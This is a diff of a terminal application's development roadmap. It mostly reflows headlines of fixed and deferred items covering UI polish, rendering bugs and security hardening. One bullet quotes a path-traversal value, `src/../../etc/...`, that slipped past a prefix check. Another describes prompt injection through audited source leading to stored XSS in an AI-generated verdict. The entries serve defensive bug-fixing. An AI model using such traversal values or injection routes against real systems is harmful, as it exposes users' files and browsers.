   `Qt6::Core` only. Unblocks ANTS-1116 v2 (`audit-run` subcommand)
@@ -6028,9 +5978,7 @@ deferred 0.8.x), ANTS-1781 (span-cache wipe + resize BlockingQueuedConnection).
 
 ### 🎨 UX — relocate the update-available indicator (user request 2026-04-30)
 
-- ✅ [ANTS-1124] **Move the "update available" link from the
-  right of the status bar to the menu bar, immediately to the
-  right of the Help menu.** Shipped 2026-05-01 (0.7.62). Migrated
+- ✅ [ANTS-1124] **Move the "update available" link from the right of the status bar to the menu bar, immediately to the right of the Help menu.** Shipped 2026-05-01 (0.7.62). Migrated
   `m_updateAvailableLabel` → `m_updateAvailableAction`; URL
   stashed via `QAction::setData`; triggered lambda replays
   through `handleUpdateClicked`. Spec at `docs/specs/ANTS-1124.md`;
@@ -6085,9 +6033,7 @@ deferred 0.8.x), ANTS-1781 (span-cache wipe + resize BlockingQueuedConnection).
 
 ### 🐛 Scrollback overwrite during streaming (user request 2026-04-30)
 
-- ✅ [ANTS-1118] **Scrolling up during a Claude Code stream
-  briefly shows overwritten text — paint-cycle race during
-  streaming.** Shipped 2026-05-01 (0.7.65). Root cause confirmed
+- ✅ [ANTS-1118] **Scrolling up during a Claude Code stream briefly shows overwritten text — paint-cycle race during streaming.** Shipped 2026-05-01 (0.7.65). Root cause confirmed
   by indie-review L2 (paint pipeline lane): smooth-scroll path
   defers snapshot capture until first non-zero `intStep`,
   opening a 16–32 ms race window where `onVtBatch` lands
@@ -6234,8 +6180,7 @@ deferred 0.8.x), ANTS-1781 (span-cache wipe + resize BlockingQueuedConnection).
 
 ### 🎨 Status-bar polish (user request 2026-04-30)
 
-- ✅ [ANTS-1109] **Restyle the git-branch chip to match the
-  repo-visibility pill.** Shipped 2026-05-01 (0.7.62). New pure
+- ✅ [ANTS-1109] **Restyle the git-branch chip to match the repo-visibility pill.** Shipped 2026-05-01 (0.7.62). New pure
   helper `branchchip::isPrimaryBranch` picks `theme.ansi[2]`
   (green) for `main`/`master`/`trunk`, `theme.ansi[3]` (amber)
   for feature branches; both `applyTheme` and `updateStatusBar`
@@ -6441,8 +6386,7 @@ deferred 0.8.x), ANTS-1781 (span-cache wipe + resize BlockingQueuedConnection).
   Closed by ANTS-1128 below.
   Kind: fix. Source: user-2026-04-30.
 
-- ✅ [ANTS-1128] **Theme stylesheet not reaching top-level
-  dialogs.** Shipped 2026-04-30. Two user reports (dropdown
+- ✅ [ANTS-1128] **Theme stylesheet not reaching top-level dialogs.** Shipped 2026-04-30. Two user reports (dropdown
   bg + Review Changes dialog screenshot) traced to one root
   cause: `MainWindow::applyTheme` was calling
   `setStyleSheet(ss)` on the `MainWindow` instance, but Qt's
@@ -6493,8 +6437,7 @@ defect (below).*
 **24 verified findings fixed inline this loop** (all severities; full suite
 1394/1394 green):
 
-- ✅ [ANTS-1796] **`subsystem op=map` emitted bogus lanes from backticked
-  library-name qualifiers** inside paren forms (`(Qt6::Core, \`ants_core_lib\`)`)
+- ✅ [ANTS-1796] **`subsystem op=map` emitted bogus lanes from backticked library-name qualifiers** inside paren forms (`(Qt6::Core, \`ants_core_lib\`)`)
   in docs/subsystems.md — `SubsystemMap::parse` harvested every backticked
   token in the prefix. Now strips paren qualifiers before harvesting. Red/green
   test `mcp_subsystem/ParenQualifierLibNameNotHarvested`.
@@ -6507,23 +6450,19 @@ defect (below).*
   the host allowlist; now `ManualRedirectPolicy`. Plus the IPv6 SSRF arm missed
   NAT64 `64:ff9b::/96` + IPv4-compatible `::/96` embedded-v4 — now extracted and
   run through the shared v4 block test.
-- ✅ [ANTS-1799] **CSI 3J cleared `m_scrollback` but not the parallel
-  `m_scrollbackHyperlinks`** — stale OSC 8 spans (old URIs) re-attached to
+- ✅ [ANTS-1799] **CSI 3J cleared `m_scrollback` but not the parallel `m_scrollbackHyperlinks`** — stale OSC 8 spans (old URIs) re-attached to
   unrelated post-clear rows. terminalgrid.cpp.
 - ✅ [ANTS-1800] **Session restore rejected `screenRows > 500`** while grid rows
   go to 2000 (ANTS-1658) — tall 4K/ultrawide sessions silently failed to
   restore. Capped at `kMaxRestoreRows`. sessionmanager.cpp.
 - ✅ [ANTS-1801] **`session_memory` dir 0700 only on create** — an existing
   0755 dir was never re-tightened. Now unconditional. sessionmemoryengine.cpp.
-- ✅ [ANTS-1802] **Lua `ants.get_output/get_cwd/settings.get` truncated at the
-  first embedded NUL** (`lua_pushstring` C-string semantics on
+- ✅ [ANTS-1802] **Lua `ants.get_output/get_cwd/settings.get` truncated at the first embedded NUL** (`lua_pushstring` C-string semantics on
   attacker-influenced terminal output) — now `lua_pushlstring` via a NUL-safe
   `pushQString` helper. luaengine.cpp.
-- ✅ [ANTS-1803] **Plugin teardown left stale `LuaEngine*` keys in
-  `m_demoted`/`m_execStart`** (UAF-by-address-reuse trap) — cleared before
+- ✅ [ANTS-1803] **Plugin teardown left stale `LuaEngine*` keys in `m_demoted`/`m_execStart`** (UAF-by-address-reuse trap) — cleared before
   delete. pluginmanager.cpp.
-- ✅ [ANTS-1804] **A detached (zombie) plugin worker could signal a destroyed
-  `PluginManager`** (parented to MainWindow, torn down at app exit while zombies
+- ✅ [ANTS-1804] **A detached (zombie) plugin worker could signal a destroyed `PluginManager`** (parented to MainWindow, torn down at app exit while zombies
   are never joined) — now `disconnect(engine, …, this, …)` on the detach path.
 - ✅ [ANTS-1805] **`PathValidation::validatePath` failed OPEN on an empty root**
   (anchor check collapsed to `startsWith("/")`) — the project-wide path
@@ -6534,20 +6473,17 @@ defect (below).*
 - ✅ [ANTS-1807] **`cold_eyes_single_doc` passed the raw doc_path to the engine**
   after validating `check.resolved` — symlink-swap TOCTOU. Now passes the
   canonical project-relative form (mirrors debt_sweep_apply_fix). remotecontrol.cpp.
-- ✅ [ANTS-1808] **Trust prompt mislabeled the whole `.ants/verify.json` as
-  "Full first-gate command"** — a multi-gate config's 2nd/3rd commands hid behind
+- ✅ [ANTS-1808] **Trust prompt mislabeled the whole `.ants/verify.json` as "Full first-gate command"** — a multi-gate config's 2nd/3rd commands hid behind
   a label claiming only the first; relabeled "Full config file". verifytrustmodal.cpp.
 - ✅ [ANTS-1809] **Stored XSS via the AI-triage `verdict`** — interpolated
   unescaped into the shareable HTML export (executes JS in a browser) and the
   in-app render; the verdict is LLM-controlled (reachable via prompt-injection
   from audited source). Whitelisted to the enum at the parse boundary +
   escaped the export sink. auditdialog.cpp.
-- ✅ [ANTS-1810] **Audit SARIF/HTML/rule-quality writers skipped
-  `fsyncParentDir`** (manifest was durable, the file it points at wasn't) and
+- ✅ [ANTS-1810] **Audit SARIF/HTML/rule-quality writers skipped `fsyncParentDir`** (manifest was durable, the file it points at wasn't) and
   `RuleQualityTracker::save` swallowed the commit result — both fixed.
   auditrunner.cpp / auditrulequality.cpp.
-- ✅ [ANTS-1811] **Roadmap headline `truncate(120)` split UTF-16 surrogate
-  pairs** (emoji near the cut → U+FFFD/broken glyph) — surrogate-safe
+- ✅ [ANTS-1811] **Roadmap headline `truncate(120)` split UTF-16 surrogate pairs** (emoji near the cut → U+FFFD/broken glyph) — surrogate-safe
   `truncateEllipsis` helper across all four sites. roadmapdialog.cpp.
 - ✅ [ANTS-1812] **Indie-review fold-in emitted two `Lanes:` lines per bullet**
   (citing-lanes + path-derived) — malformed vs roadmap-format's single field;
@@ -6558,19 +6494,16 @@ defect (below).*
   prior tab's "→ Opus" recommendation (with a click that sends `/model` to the
   wrong tab) until the next 2 s tick; now hidden + cache-invalidated in
   `resetForTabSwitch`. claudestatuswidgets.cpp.
-- ✅ [ANTS-1815] **`findMatchingBracket` scanned the entire (≤1M-line)
-  scrollback on the GUI thread** inside paintEvent on an unmatched bracket —
+- ✅ [ANTS-1815] **`findMatchingBracket` scanned the entire (≤1M-line) scrollback on the GUI thread** inside paintEvent on an unmatched bracket —
   bounded to a few screens (an off-screen match can't be highlighted). terminalwidget.cpp.
 - ✅ [ANTS-1816] **`audit_run` rawCount/noiseRatePct counted tool banners** as
   findings for plain-text tools — now counts only location-shaped lines. auditrunner.cpp.
-- ✅ [ANTS-1817] **bg-task completion fallback recompiled a regex per tracked id
-  per event** on every transcript-append rescan — cheap `contains()` pre-filter.
+- ✅ [ANTS-1817] **bg-task completion fallback recompiled a regex per tracked id per event** on every transcript-append rescan — cheap `contains()` pre-filter.
   claudebgtasks.cpp.
 - ✅ [ANTS-1818] **Stale a11y comment** claimed `setTabAccessibleName()` where
   the code uses `setTabToolTip()` (Qt6 has no per-tab accessible-name setter).
   coloredtabbar.h.
-- ✅ [ANTS-1819] **`inlineRelevantSections` accumulated the whole keyword-dense
-  doc** (e.g. ROADMAP.md) before truncating to the byte cap — early-break.
+- ✅ [ANTS-1819] **`inlineRelevantSections` accumulated the whole keyword-dense doc** (e.g. ROADMAP.md) before truncating to the byte cap — early-break.
   briefdispatch.cpp.
 
 Items below are deferred — verified-real but larger than a one-loop fix.
@@ -6583,8 +6516,7 @@ Tiered: 🔒 security/data-loss · ⚡ hardening/correctness · 🏗 structural/
   `auditdialog.cpp:~4713`; `AuditRunner::runAudit` never loads the ledger) — a
   learned FP recorded in the GUI re-surfaces on every MCP/CI sweep. Wire the
   engine fn into both paths. Verified 2026-05-22.
-- ✅ [ANTS-1821] **`SessionManager::sessionDir` create-then-chmod TOCTOU +
-  swallowed `setPermissions` return.** `sessionmanager.cpp:24` `mkpath` (umask
+- ✅ [ANTS-1821] **`SessionManager::sessionDir` create-then-chmod TOCTOU + swallowed `setPermissions` return.** `sessionmanager.cpp:24` `mkpath` (umask
   0755) then post-chmod 0700; want an atomic `mkdir(0700)` shared helper (the
   same create-then-chmod shape recurs in sessionmemoryengine + others). Same-UID
   threat model so defense-in-depth. Verified 2026-05-22.
@@ -6592,8 +6524,7 @@ Tiered: 🔒 security/data-loss · ⚡ hardening/correctness · 🏗 structural/
   `sessionmanager.cpp:~605` glob is broader than the two filenames it owns;
   scope to `session_*.dat.tmp` / `tab_order.txt.tmp` so it can't delete a
   foreign/in-flight temp. Verified 2026-05-22.
-- ✅ [ANTS-1823] **`session_memory`/`workflow_state` read-modify-write is
-  unlocked across concurrent same-cwd CC sessions** (last-writer-wins drops a
+- ✅ [ANTS-1823] **`session_memory`/`workflow_state` read-modify-write is unlocked across concurrent same-cwd CC sessions** (last-writer-wins drops a
   key), and `workflow_state` set does the load/mutate/save TWICE (TTL purge +
   Set). Collapse to one cycle + add advisory lock in `saveStore`. The
   multi-session-tester workflow makes this reachable. Verified 2026-05-22.
@@ -6634,16 +6565,13 @@ Tiered: 🔒 security/data-loss · ⚡ hardening/correctness · 🏗 structural/
   of `PathValidation::validatePath` (`remotecontrol.cpp:~8425`) and drops bad
   entries silently — route through the central chokepoint (ANTS-1295) + signal
   rejects. Verified 2026-05-22.
-- ✅ [ANTS-1832] **indie-review override `sourcePaths` only `startsWith("src/")`,
-  not component-anchored** (`indiereviewengine.cpp:~110`) — `src/../../etc/...`
+- ✅ [ANTS-1832] **indie-review override `sourcePaths` only `startsWith("src/")`, not component-anchored** (`indiereviewengine.cpp:~110`) — `src/../../etc/...`
   passes the prefix; reaches the brief header before the canonicalisation guard.
   Cold-eyes already hardened this (CR-1); apply parity. Verified 2026-05-22.
-- ✅ [ANTS-1833] **Inline `audit_run`/`indie_review_dispatch` handlers don't
-  bad_path-validate `caller_cwd`** (`mainwindow.cpp:~4047/4487`) — a non-existent
+- ✅ [ANTS-1833] **Inline `audit_run`/`indie_review_dispatch` handlers don't bad_path-validate `caller_cwd`** (`mainwindow.cpp:~4047/4487`) — a non-existent
   root canonicalises to "" and collapses the in-flight key; the dispatcher only
   enforces non-empty. Add an isDir/bad_path gate. Verified 2026-05-22.
-- ✅ [ANTS-1834] **Contract-drift guard is `Q_ASSERT_X` (compiled out in
-  Release).** `claudeintegration.cpp:~1207` — a call-site `caller_cwd`
+- ✅ [ANTS-1834] **Contract-drift guard is `Q_ASSERT_X` (compiled out in Release).** `claudeintegration.cpp:~1207` — a call-site `caller_cwd`
   classification that disagrees with `callerCwdContractFor` neither refuses nor
   aborts in a Release build, contradicting the comment. Make it a compiled
   check. Verified 2026-05-22.
@@ -6652,8 +6580,7 @@ Tiered: 🔒 security/data-loss · ⚡ hardening/correctness · 🏗 structural/
   buttons acting on the focused terminal) before session routing, so a
   background tab's prompt paints on the focused tab. Gate the message/buttons on
   the same routing the glyph uses. Verified 2026-05-22.
-- ✅ [ANTS-1836] **Test-audit report writes are non-atomic / no 0600 /
-  silent-fail.** `testauditdialog.cpp:~48/259` plain `QFile` WriteOnly|Truncate,
+- ✅ [ANTS-1836] **Test-audit report writes are non-atomic / no 0600 / silent-fail.** `testauditdialog.cpp:~48/259` plain `QFile` WriteOnly|Truncate,
   return discarded — use `QSaveFile` + 0600 + checked commit (the auditcache
   pattern). Verified 2026-05-22.
 - ✅ [ANTS-1837] **`validatePath` trusts `rootCanonical` NFC form.**
@@ -6696,8 +6623,7 @@ Tiered: 🔒 security/data-loss · ⚡ hardening/correctness · 🏗 structural/
   `ai_endpoint` while the modeless dialog is open; `setLanes()` wipes already-
   collected reports on any lane checkbox toggle. `reviewdialogbase.cpp` /
   `testauditdialog.cpp`. Verified 2026-05-22.
-- ✅ [ANTS-1844] **`roadmap_query` re-splits the 19k-line ROADMAP 3-4× per
-  call.** `sliceSection` (`roadmapindex.cpp:189`), `buildIndex`, `parseBullets`,
+- ✅ [ANTS-1844] **`roadmap_query` re-splits the 19k-line ROADMAP 3-4× per call.** `sliceSection` (`roadmapindex.cpp:189`), `buildIndex`, `parseBullets`,
   `renderCardsHtml` each `split('\n')` the whole doc; `sliceSection` should walk
   from a cached offset. Verified 2026-05-22.
 - ✅ [ANTS-1845] **claudeintegration scan/probe cluster.** `processStartTimeMs`
@@ -6983,8 +6909,7 @@ class; the deferrals below cover the rest.
 
 #### 🔒 Tier 1 — security & data-loss
 
-- ✅ [ANTS-1333] **`m_scrollbackHyperlinks` not lockstep with
-  `m_scrollback` on reflow (lane-1 H1).** Shipped 2026-05-15 (Bundle A
+- ✅ [ANTS-1333] **`m_scrollbackHyperlinks` not lockstep with `m_scrollback` on reflow (lane-1 H1).** Shipped 2026-05-15 (Bundle A
   pull 1). `TerminalGrid::resize()` width-change reflow now carries
   the parallel `m_scrollbackHyperlinks` deque alongside the
   rebuild — fast-path rows preserve their spans with column
@@ -7016,8 +6941,7 @@ class; the deferrals below cover the rest.
   Kind: fix.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1334] **Combining marks on wide-char right-edge
-  attach to continuation cell (lane-1 H3).** Shipped 2026-05-15
+- ✅ [ANTS-1334] **Combining marks on wide-char right-edge attach to continuation cell (lane-1 H3).** Shipped 2026-05-15
   (Bundle A pull 2). Pre-fix, after a wide char at cols-2 the
   m_wrapNext + cursor-clamp left m_cursorCol on the continuation
   cell; a subsequent zero-width combiner stored to `combining[
@@ -7046,8 +6970,7 @@ class; the deferrals below cover the rest.
   Kind: fix.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1335] **C1 8-bit control bytes pass through
-  `filterControlChars` (lane-2 M2).** `remotecontrol.cpp:335`
+- ✅ [ANTS-1335] **C1 8-bit control bytes pass through `filterControlChars` (lane-2 M2).** `remotecontrol.cpp:335`
   → `sendToPty` writes user-controlled bytes verbatim after C0
   strip. C1 (U+0080..U+009F) bytes are explicitly NOT stripped
   at the byte level (header comment says "stripping C1 is the
@@ -7066,8 +6989,7 @@ class; the deferrals below cover the rest.
   Kind: security.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1336] **`session_memory` `cwd` arg cross-project
-  tenancy bypass (lane-5 HI-1).** Shipped 2026-05-16 (Bundle B
+- ✅ [ANTS-1336] **`session_memory` `cwd` arg cross-project tenancy bypass (lane-5 HI-1).** Shipped 2026-05-16 (Bundle B
   pull 2). RcGate now applies to every op (get / list / set /
   delete), not just mutates. `caller_cwd` is the only project-
   scope source; the user-supplied `cwd` arg is ignored by the
@@ -7086,8 +7008,7 @@ class; the deferrals below cover the rest.
   Kind: security.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1337] **`verify_changes` arbitrary shell from
-  `.ants/verify.json` — hostile-clone vector (lane-5 HI-2).**
+- ✅ [ANTS-1337] **`verify_changes` arbitrary shell from `.ants/verify.json` — hostile-clone vector (lane-5 HI-2).**
   `verifyengine.cpp:290–291` runs `gc.command` from
   `.ants/verify.json` against `/bin/sh -c` with the user's UID.
   The threat model in ANTS-1294 § 1 explicitly addresses hostile
@@ -7105,8 +7026,7 @@ class; the deferrals below cover the rest.
   Kind: security.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1338] **`sessionPathForCwd` PID-reuse defense
-  (lane-3 H2).** Linux PID reuse on a busy system recycles
+- ✅ [ANTS-1338] **`sessionPathForCwd` PID-reuse defense (lane-3 H2).** Linux PID reuse on a busy system recycles
   within seconds. The two-layer freshness filter
   (`processStartTimeMs`-anchored at `claudeintegration.cpp:421`)
   trusts the live PID is a Claude Code process. Caller
@@ -7125,8 +7045,7 @@ class; the deferrals below cover the rest.
   Source: indie-review-2026-05-14.
   Resolved (2026-06-27): the substantive PID-reuse risk is structurally closed by hardenings landed after this item was filed. sessionPathForCwd never trusts PID identity — activeSessionPath feeds processStartTimeMs(m_claudePid) as a freshness FLOOR (minLastEventMs). A reused PID yields a newer start time → stricter floor → can only reject candidates, never surface a dead/foreign transcript (ANTS-1845 floor-only design; ANTS-2191 closes the mtime-spoof gap via requireContentTs). Took the roadmap's stated alternative ("document the caller's contract loudly"): added an explicit PID-reuse contract comment at sessionPathForCwd so no future caller misuses minLastEventMs as trusted identity. No argv recheck needed (the fn receives a timestamp, not a PID).
 
-- ✅ [ANTS-1375] **Per-tab Claude state dot regression — dots
-  missing on tabs with active CC sessions (v0.7.91).** Confirmed
+- ✅ [ANTS-1375] **Per-tab Claude state dot regression — dots missing on tabs with active CC sessions (v0.7.91).** Confirmed
   by user screenshot 2026-05-14: 5 tabs labelled "Claude: …"
   (Ants Terminal, MAME Curator, RetroDB, Album Builder, Vestige)
   all have running CC sessions, yet no per-tab state dot appears
@@ -7163,8 +7082,7 @@ class; the deferrals below cover the rest.
 
 #### 🧹 Debt-sweep fold-in (2026-05-14, build warnings)
 
-- ✅ [ANTS-1374] **Expand the tab title-background colour palette
-  + picker.** The current `tab_color_sequence` config key
+- ✅ [ANTS-1374] **Expand the tab title-background colour palette + picker.** The current `tab_color_sequence` config key
   (`config.cpp:1019–1027`) accepts an ordered JSON array of
   colours; the in-app picker (`mainwindow.cpp` tab-context menu)
   exposes a fixed swatch list. User request 2026-05-14: more
@@ -7184,8 +7102,7 @@ class; the deferrals below cover the rest.
 
 #### 🔒 Tier 2 — hardening sweep
 
-- ✅ [ANTS-1339] **`applyFilter` line-split materialisation on
-  64 MB tool output (lane-4 M3).** Shipped 2026-05-18 (Bundle G
+- ✅ [ANTS-1339] **`applyFilter` line-split materialisation on 64 MB tool output (lane-4 M3).** Shipped 2026-05-18 (Bundle G
   pull 15). `AuditEngine::applyFilter` now streams over `raw` with
   `indexOf('\n')` + slice and bails as soon as `keptCount >=
   f.maxLines`, instead of materialising the full QStringList up
@@ -7202,8 +7119,7 @@ class; the deferrals below cover the rest.
   Kind: perf.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1340] **`cmdSubsystem` synchronous per-file git
-  invocation blocks GUI (lane-2 M7).** `remotecontrol.cpp:1797–
+- ✅ [ANTS-1340] **`cmdSubsystem` synchronous per-file git invocation blocks GUI (lane-2 M7).** `remotecontrol.cpp:1797–
   1812` invokes `cmdGitState({op:"log", path: f})` for each
   file in a lane. Each call spawns a git process with a 5 s
   wall-budget. For a 20-file lane the worst case is 20 × 5 s
@@ -7217,8 +7133,7 @@ class; the deferrals below cover the rest.
   Source: indie-review-2026-05-14.
   Resolved (2026-06-27): runLogOp now accepts a paths[] array; cmdSubsystem recent_changes issues ONE batched `git log -- <files>` instead of forking git per file (was worst-case 20×5 s GUI block). git returns the union deduped + date-sorted, equivalent to the prior per-file merge. McpSubsystem.WiringContract green.
 
-- ✅ [ANTS-1341] **`claudetasklist` Mode B `in_progress` leak
-  accumulates forever (lane-3 H3).** Shipped 2026-05-16 (Bundle F
+- ✅ [ANTS-1341] **`claudetasklist` Mode B `in_progress` leak accumulates forever (lane-3 H3).** Shipped 2026-05-16 (Bundle F
   pull 2). Added `qint64 lastEventAtMs` to `ClaudeTask`; the
   parser stamps it from the event timestamp on every TaskCreate /
   TaskUpdate / TodoWrite, and tracks `latestEventMs` advancing on
@@ -7254,8 +7169,7 @@ class; the deferrals below cover the rest.
   Kind: fix.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1343] **`consolidateMypyStubHints` `findingCount`
-  clobber (lane-4 M2).** Shipped 2026-05-18 (Bundle G pull 15).
+- ✅ [ANTS-1343] **`consolidateMypyStubHints` `findingCount` clobber (lane-4 M2).** Shipped 2026-05-18 (Bundle G pull 15).
   Added `bool findingCountAuthored = false;` to `CheckResult`.
   The consolidator (now lifted to `AuditEngine::consolidate-
   MypyStubHints`, so it's testable without a QDialog) captures
@@ -7275,8 +7189,7 @@ class; the deferrals below cover the rest.
   Kind: fix.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1344] **`extractCitedCodePaths` 64 KiB scan cap
-  silently truncates reports (lane-5 ME-4).** Shipped 2026-05-18
+- ✅ [ANTS-1344] **`extractCitedCodePaths` 64 KiB scan cap silently truncates reports (lane-5 ME-4).** Shipped 2026-05-18
   (Bundle G pull 15). Surfaced truncation as three envelope
   fields — `truncated: true`, `truncated_lanes: ["…"]`,
   `truncated_at_bytes: 65536` — across both
@@ -7299,8 +7212,7 @@ class; the deferrals below cover the rest.
   Kind: fix.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1345] **Cold-eyes `derivePartition` mtime-gameable
-  (lane-5 ME-5).** Shipped 2026-05-18 (Bundle G pull 15). The
+- ✅ [ANTS-1345] **Cold-eyes `derivePartition` mtime-gameable (lane-5 ME-5).** Shipped 2026-05-18 (Bundle G pull 15). The
   spec-lane comparator buckets `lastModified` into 1 s windows
   and tiebreaks within a bucket by path-lex ascending. Bucketing
   (rather than a tolerance window) keeps the comparator a strict
@@ -7323,8 +7235,7 @@ class; the deferrals below cover the rest.
   Kind: fix.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1346] **`roadmap_query` section cache unbounded
-  growth (lane-5 ME-1).** `remotecontrol.cpp:756`. The cache
+- ✅ [ANTS-1346] **`roadmap_query` section cache unbounded growth (lane-5 ME-1).** `remotecontrol.cpp:756`. The cache
   is keyed on section slug; the slug set is implicitly bounded
   by ROADMAP heading count, but only wiped when `mtime`
   changes. On a stable ROADMAP, the cache grows monotonically
@@ -7341,8 +7252,7 @@ class; the deferrals below cover the rest.
   Kind: perf.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1347] **`cmdLaunch` / `cmdNewTab` `cwd` arg not
-  validatePath'd (lane-2 M3).** `remotecontrol.cpp:506–525,
+- ✅ [ANTS-1347] **`cmdLaunch` / `cmdNewTab` `cwd` arg not validatePath'd (lane-2 M3).** `remotecontrol.cpp:506–525,
   562–576`. Only `hasControlOrBackslash` is checked. Same-UID
   trust permits any reachable directory — `/etc`, `/var/log`,
   etc. Not an escape but a sidestep of the project-root anchor
@@ -7356,8 +7266,7 @@ class; the deferrals below cover the rest.
   Kind: security.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1348] **`cmdGetText` no server-side byte cap
-  (lane-2 M4).** `remotecontrol.cpp:415` caps at 10 000 lines
+- ✅ [ANTS-1348] **`cmdGetText` no server-side byte cap (lane-2 M4).** `remotecontrol.cpp:415` caps at 10 000 lines
   but not bytes. A 10 000-line scrollback of 4 KB lines yields
   a 40 MB JSON document; client-side 1 MiB cap then truncates
   the response mid-stream and reports a "socket hijack." Fix:
@@ -7369,8 +7278,7 @@ class; the deferrals below cover the rest.
   Kind: fix.
   Source: indie-review-2026-05-14.
 
-- ✅ [ANTS-1349] **Pty `EAGAIN` silent drop > 4 MB (lane-2
-  M6).** `ptyhandler.cpp:427–433`. The current EAGAIN branch
+- ✅ [ANTS-1349] **Pty `EAGAIN` silent drop > 4 MB (lane-2 M6).** `ptyhandler.cpp:427–433`. The current EAGAIN branch
   drops bytes (with only a debug log) when the pending-write
   buffer would exceed 4 MB. Same outcome as the pre-fix
   regression the comment warns against; only the control flow
@@ -7386,8 +7294,7 @@ class; the deferrals below cover the rest.
 
 #### 🐛 Tier 3 — small fixes & cleanup
 
-- ✅ [ANTS-1350] **Roadmap dialog tab order + compact font
-  size (lane-6 L-1, L-2).** No explicit `setTabOrder` —
+- ✅ [ANTS-1350] **Roadmap dialog tab order + compact font size (lane-6 L-1, L-2).** No explicit `setTabOrder` —
   current order is creation-order-incidental and will shuffle
   silently when a widget is inserted. Compact density emits 9
   px font in `.rm-state-label` / `.rm-kind` / `.rm-section-
@@ -7625,8 +7532,7 @@ The full audit / indie-review / debt-sweep cycle on 2026-05-14
 exposed structural gaps in the MCP surface that the per-finding
 fixes don't address. Roadmapped here as their own design tasks.
 
-- ✅ [ANTS-1868] **`changelog_log` `add_from_roadmap` emits the raw
-  multi-line ROADMAP headline into the CHANGELOG bullet.** When a cited
+- ✅ [ANTS-1868] **`changelog_log` `add_from_roadmap` emits the raw multi-line ROADMAP headline into the CHANGELOG bullet.** When a cited
   ROADMAP bullet's headline wraps across source lines (common — e.g.
   ANTS-1099, ANTS-1867), `op:"add_from_roadmap"` copies it verbatim, so
   the bold summary carries a hard newline whose second line isn't indented
@@ -7674,8 +7580,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Kind: implement.
   Source: indie-review-2026-05-14 (self-observed).
 
-- ✅ [ANTS-1353] **`docs/standards/mcp-error-codes.md` —
-  central code taxonomy.** Every MCP tool emits a `code` field
+- ✅ [ANTS-1353] **`docs/standards/mcp-error-codes.md` — central code taxonomy.** Every MCP tool emits a `code` field
   on error (`bad_path`, `bad_args`, `bad_pattern`, `bad_glob`,
   `no_project`, `no_window`, `not_found`, `cap_exceeded`,
   `io_error`, `no_remote_control`, …). The set has grown ad-
@@ -7700,8 +7605,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Kind: refactor.
   Source: indie-review-2026-05-14 (self-observed).
 
-- ✅ [ANTS-1355] **`token_usage` v2 — wrap-overhead + latency
-  breakdown.** Shipped 2026-05-15. `token_usage` MCP response
+- ✅ [ANTS-1355] **`token_usage` v2 — wrap-overhead + latency breakdown.** Shipped 2026-05-15. `token_usage` MCP response
   now surfaces per-tool `wrap_bytes` (cumulative ANTS-1294
   framing overhead), `duration_us_{min,max,mean}` (latency
   bounds + integer mean), plus envelope `total_wrap_bytes`.
@@ -7822,8 +7726,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Lanes: debtsweepengine.
   Source: deferred from ANTS-1358 (in-session 2026-05-20).
 
-- ✅ [ANTS-1704] **`roadmap_log op:append` drops args on rich body —
-  investigate.** Observed 2026-05-20 (Pull 43 session): six
+- ✅ [ANTS-1704] **`roadmap_log op:append` drops args on rich body — investigate.** Observed 2026-05-20 (Pull 43 session): six
   consecutive `op:append` calls returned
   `{ok:false, code:"caller_cwd_required"}` even though `caller_cwd`
   was supplied each time — i.e. the *entire* argument object appeared
@@ -7900,8 +7803,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Kind: refactor.
   Source: indie-review-2026-05-14 (self-observed).
 
-- ✅ [ANTS-1410] **`/audit` skill enumerates project-specific CI
-  gates.** Cross-session report 2026-05-15 (MAME Curator session):
+- ✅ [ANTS-1410] **`/audit` skill enumerates project-specific CI gates.** Cross-session report 2026-05-15 (MAME Curator session):
   the skill's tool list (ruff, bandit, semgrep, gitleaks, cppcheck,
   clazy) is generic and project-agnostic. MAME Curator's
   `.github/workflows/ci.yml` includes a `tools/check_api_types_sync.py`
@@ -7931,8 +7833,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Source: cross-session-report-2026-05-15 (MAME Curator —
   DS02 R2 hot-fix root cause).
 
-- ✅ [ANTS-1411] **`cold_eyes_partition` spec-lane detection
-  hardcoded to `ANTS-NNNN.md` filename shape.**
+- ✅ [ANTS-1411] **`cold_eyes_partition` spec-lane detection hardcoded to `ANTS-NNNN.md` filename shape.**
   `coldeyesengine.cpp:223,245` builds spec-lane paths as
   `QStringLiteral("docs/specs/ANTS-%1.md").arg(id)`. Cross-session
   report 2026-05-15: MAME Curator has 13 specs under `docs/specs/`
@@ -7955,8 +7856,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Kind: fix.
   Source: cross-session-report-2026-05-15 (MAME Curator).
 
-- ✅ [ANTS-1412] **`cold_eyes_partition` `.cold-eyes/partition.json`
-  override schema undocumented + silent fallback on malformed.**
+- ✅ [ANTS-1412] **`cold_eyes_partition` `.cold-eyes/partition.json` override schema undocumented + silent fallback on malformed.**
   Cross-session report 2026-05-15: caller hand-built
   `.cold-eyes/partition.json` with what they believed was a
   reasonable shape (`{"lanes":[{"name":...,"doc_paths":[...],
@@ -7982,8 +7882,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Kind: fix.
   Source: cross-session-report-2026-05-15 (MAME Curator).
 
-- ✅ [ANTS-1413] **`cold_eyes_single_doc` brief tool for
-  single-spec review.** The current cold-eyes MCP surface
+- ✅ [ANTS-1413] **`cold_eyes_single_doc` brief tool for single-spec review.** The current cold-eyes MCP surface
   (`partition` / `brief` / `cross_doc_diff` / `corroborate` /
   `fold_in`) is designed for full-doc-tree sweeps. For a single
   new spec drafted in conversation, there's no clean entry-point:
@@ -8006,8 +7905,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Kind: implement.
